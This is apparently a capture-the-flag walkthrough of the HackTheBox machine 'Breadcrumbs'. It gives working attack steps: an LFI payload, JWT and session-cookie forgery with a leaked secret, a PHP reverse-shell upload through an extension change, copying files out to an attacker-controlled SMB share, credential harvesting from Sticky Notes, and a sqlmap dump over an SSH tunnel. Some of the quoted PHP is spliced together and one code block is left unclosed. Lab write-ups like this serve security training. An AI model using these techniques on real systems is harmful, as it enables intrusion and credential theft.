Hi everyone, today we are going to be looking at Breadcrumbs --`10.10.10.228`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

From the output shown above, we can see that the machine is a Windows machine. I started off by browsing the HTTP -- port 80 -- web page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img1.png"  style="width: 80%" />
</p>


The page itself just seemed to be a library with some basic search functionality. The HTTPS instance -- port 443 -- seemed to be hosting the exact same web application. Looking into the web application, it said it was created by helich0pper, but the link redirected to the following GitHub page: <https://github.com/helich0pper>.

While I was browsing the web application, I ran a GoBuster scan in the background. The output is provided below:

<details>

</details>


There were a few directories that the scan identified, but I was interested in the `/portal` directory. After navigating to the directory I was presented with the following login screen:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img2.png"  style="width: 80%" />
</p>


As shown above, it seemed as if I would not be able to log into the application from my host. I clicked on the `helpers` link which redirected me to the following web page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img3.png"  style="width: 80%" />
</p>


Even though I was unable to contact them using the page, I now had a list of potential users. I tried my luck and I was able to create a new profile from the login screen. Once I was registered, I logged in to the application as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img4.png"  style="width: 80%" />
</p>


I navigated to the `User Management` section and identified 3 additional users, namely:
- Sirine
- Juliette
- Support

I was also able to identify which user's were admins and super admins. However, it didn't provide me with any additional methods that I could potentially use to exploit the application. I continued my search and browsed to the `Issues` link:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img5.png"  style="width: 80%" />
</p>


I intercepted the logout request which simply contained a PHP Session Cookie and a JWT token which had a data field. I attempted to add in a `position` field and created a new JWT token as shown below:


```json
Headers = {
  "typ": "JWT",
  "alg": "HS256"
}

Payload = {
  "data": {
    "username": "test",
    "position": "super admin"
  }
}

```

Failure! At this point it didn't work and I wasn't sure how I should continue. I decided to take a step back and went back to the main page. 

### Local File Inclusion

I started off by attempting to inject into the various fields but it didn't lead anywhere. After a while. I changed the `method` to `1` which threw the following error:

```json
Undefined array key "book" in C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php

Warning:  file_get_contents(../books/): Failed to open stream: No such file or directory in C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php
```

Alright, maybe there was something here. I started playing around with of the fields, but it seemed as though using method `1` it was specifically looking for:
- A `book` parameter
- A file to include

I changed the method to represent that, which looked as follows:

```json
book=../index.php&method=1
```

This successfully retrieved the `index.php` file and I now had Local File Inclusion (LFI). I decided to focus my efforts on the portal and started with the `login.php` page. The page relied on the `authController.php` page which had the following content:

<details>

```php
"<?php \r\nrequire 'db\/db.php';\r\nrequire \"cookie.php\";\r\nrequire \"vendor\/autoload.php\";\r\nuse \\Firebase\\JWT\\JWT;\r\n\r\n$errors = array();\r\n$username = \"\";\r\n$userdata = array();\r\n$valid = false;\r\n$IP = $_SERVER['REMOTE_ADDR'];\r\n\r\n\/\/if user clicks on login\r\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\r\n    if($_POST['method'] == 0){\r\n        $username = $_POST['username'];\r\n        $password = $_POST['password'];\r\n        \r\n        $query = \"SELECT username,position FROM users WHERE username=?

LIMIT 1\";\r\n        $stmt = $con->prepare($userQuery);\r\n        $stmt ->bind_param('s',$username);\r\n        $stmt->execute();\r\n        $result = $stmt->get_result();\r\n        $userCount = $result->num_rows;\r\n        $stmt->close();\r\n\r\n        if($userCount > 0){\r\n            $errors['username'] = \"Username already exists\";\r\n        }\r\n\r\n        if(count($errors) === 0){\r\n            $password = sha1($password);\r\n            $sql = \"INSERT INTO users(username, password, age, position) VALUES (?,?, 0, '')\";\r\n            $stmt = $con->prepare($sql);\r\n            $stmt ->bind_param('ss', $username, $password);\r\n\r\n            if ($stmt->execute()){\r\n                $user_id = $con->insert_id;\r\n                header('Location: login.php');\r\n            }\r\n            else{\r\n                $_SESSION['loggedIn'] = false;\r\n                $errors['db_error']=\"Database error: failed to register\";\r\n            }\r\n        }\r\n    }\r\n}"

```

</details>

From the file, I now had access to the SecretKey: `6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e` which I could use to generate JWT tokens. I continued searching and came across a `cookie.php` file:

```php
"<?php\r\n\/**\r\n * @param string $username  Username requesting session cookie\r\n * \r\n * @return string $session_cookie Returns the generated cookie\r\n * \r\n * @devteam\r\n * Please DO NOT use default PHPSESSID; our security team says they are predictable.\r\n * CHANGE SECOND PART OF MD5 KEY EVERY WEEK\r\n * *\/\r\nfunction makesession($username){\r\n    $max = strlen($username) - 1;\r\n    $seed = rand(0, $max);\r\n    $key = \"s4lTy_stR1nG_\".$username[$seed].\"(!528.\/9890\";\r\n    $session_cookie = $username.md5($key);\r\n\r\n    return $session_cookie;\r\n}"
```

It seemed as if the file was used to generate the actual JWT token, and since I had the code I would be able to generate the tokens myself. I decided to use the information that I had before, and I tried to generate a token for an **Active** administrator. After running the code several times, I was able to generate the following potential Session cookies:

```text
paul47200b180ccd6835d25d034eeb6e6390
paul61ff9d4aaefe6bdf45681678ba89ff9d
paul8c8808867b53c49777fe5559164708c3
paula2a6a014d3bee04d7df8d5837d62e8c5
```


In order to exploit this, I needed to perform the following:
- Create a new JWT using the session tokens above
- Log into the `test` user account that I created
- Change the JWT to the newly created JWT

To create the JWT token, I used [jwt.io](https://jwt.io/) and included the first session cookie within the `Verify Signature` field which resulted in the following token:

```json
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU
```

After logging into the application, I opened the developer console and changed both tokens to reflect the tokens that I generated for Paul. Once they were altered, I refreshed the page and I was authenticated as the Paul user:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img6.png"  style="width: 80%" />
</p>


### Exploiting Paul

With access to an administrative user, I was now able to upload a file:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img7.png"  style="width: 80%" />
</p>

As shown above, the file upload only accepted `.zip` files, and since the web application made use of PHP files, I would attempt to upload a PHP reverse shell. I started by locating a web shell and decided to make use of the following PHP reverse shell:

```bash
/usr/share/webshells/php/php-reverse-shell.php
```

Once I altered the local IP address, I moved the file to `hotshoto.zip` and uploaded it via the upload functionality. I intercepted the file upload and changed the file extension to `.php` using Burpsuite.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img8.png"  style="width: 80%" />
</p>

I ran into the following issue when attempting to upload the file:


```text
Fatal error: Uncaught Firebase\JWT\SignatureInvalidException: Signature verification failed in C:\Users\www-data\Desktop\xampp\htdocs\portal\vendor\firebase\php-jwt\src\JWT.php:122 Stack trace: #0 C:\Users\www-data\Desktop\xampp\htdocs\portal\includes\fileController.php(12): Firebase\JWT\JWT::decode('eyJ0eXAiOiJKV1Q...', '6cb9c1a2786a483...', Array) #1 C:\Users\www-data\Desktop\xampp\htdocs\portal\includes\fileController.php(18): validate() #2 {main} thrown in C:\Users\www-data\Desktop\xampp\htdocs\portal\vendor\firebase\php-jwt\src\JWT.php on line 122
```

Once I managed to sort out the issue with the JWT token -- I was missing a line break -- and uploading the file, I retrieved confirmation:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img9.png"  style="width: 80%" />
</p>


With the file uploaded, I needed to browse to `https://10.10.10.228/portal/uploads/` and activate the reverse shell:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img10.png"  style="width: 80%" />
</p>


## Lateral Movement using WWW-Data
With access to the host, I started by browsing files within the `www-data` directory.  I navigated to the **pizzaDeliveryUserData** directory and came across several files:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img11.png"  style="width: 80%" />
</p>



The only file which did not have the `.disabled` extension was `juliette.json`. Opening the file, I was able to find a username and password for `juliette`:

```json
{
        "pizza" : "margherita",
        "size" : "large",
        "drink" : "water",
        "card" : "VISA",
        "PIN" : "9890",
        "alternate" : {
                "username" : "juliette",
                "password" : "jUli901./())!",
        }
}
```

Using the credentials, I was able to log into the host via SSH:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img12.png"  style="width: 80%" />
</p>


## Lateral Movement using Juliette

With SSH access to the host, I started by performing some basic enumeration:

```bash
juliette@BREADCRUMBS C:\Users\juliette>echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & ech
o. & echo Hostname: & hostname & echo. & ipconfig /all


whoami:
breadcrumbs\juliette
juliette

```

I started browsing the `C:` directory and came across an `Anouncements` folder which contained a `main.txt` file:

```text

Multiple complaints have been made.
```

Since I wasn't sure what to make of it and since I didn't have access to the `Development` directory, I continued enumerating the host and looked into the user's home directory. Within the directory I found a `todo.html` file:

```html

As shown by the todo list above, the user mentioned password migration from Sticky Notes. In order to exploit this, I needed to find Sticky Notes. Sticky Notes are stored in the user's AppData directory, more information can be found at the following URL: <https://www.howtogeek.com/283472/how-to-back-up-and-restore-sticky-notes-in-windows/>. I navigated to Juliette's AppData directory and ended up at the following path:
 
```bash
C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
```

The directory contained several files:

There are several methods which could be used to transfer the contents of the directory to your host, I decided to make use of Impacket's SMB server which was done using the following commands:

```bash
### On Kali Machine
sudo impacket-smbserver kali . -smb2support

### On Breadcrumbs host
copy * \\10.10.14.112\kali
```

With access to the sqlite database, I opened the database using sqlitebrowser and navigated to the **Notes** table which contained the following information:

```text
\\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!

\\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g

\\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: \[MOVED\]
```

## Privilege Escalation using Development
Using the credentials shown above, I was able to log into the host with the development account.

Since I was now a developer, I attempted to access the `C:\Development` directory which contained `Krypter_Linux`. I copied the file to my Kali machine and started to view the contents of the Binary. Running `file` on the Binary:

```bash
vagrant@ko:~/Desktop/HackTheBox/Breadcrumbs/smb$ file Krypter_Linux 
Krypter_Linux: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3.2.0, not stripped
```

After running `Strings` on the file, I came across the following lines:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img15.png"  style="width: 80%" />
</p>


As shown above, the new password manager was called PassManager and it most likely contained the Administrator's password. From within the developer SSH session, I used the following command to select the information from the password's table:

```url
curl "http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords"

```

The command produced the following AES_Key:

```json
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("      
  }
}
```

Unfortunately, that was all the information that I could retrieve from the database using the basic curl command so I decided to use SQLMap against the connection. In order to use SQLMap, I needed to do a SSH portforward with the following:

```bash
ssh -N -L 1234:127.0.0.1:1234 development@10.10.10.228  

```

Now that the port was forwarded, I could use SQLMap to enumerate the database:

```bash
vagrant@ko:~/Desktop/HackTheBox/Breadcrumbs$ sqlmap --url "http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords" --dump
```


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img16.png"  style="width: 80%" />
</p>
  
From the  output shown above, SQLMap was able to retrieve the user's password hash and the associated AES_Key. Using this information, I used CyberChef to decode the password:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img17.png"  style="width: 80%" />
</p>

As a final step, I authenticated to the host using the administrator's credentials via SSH:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img18.png"  style="width: 80%" />
</p>



That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.
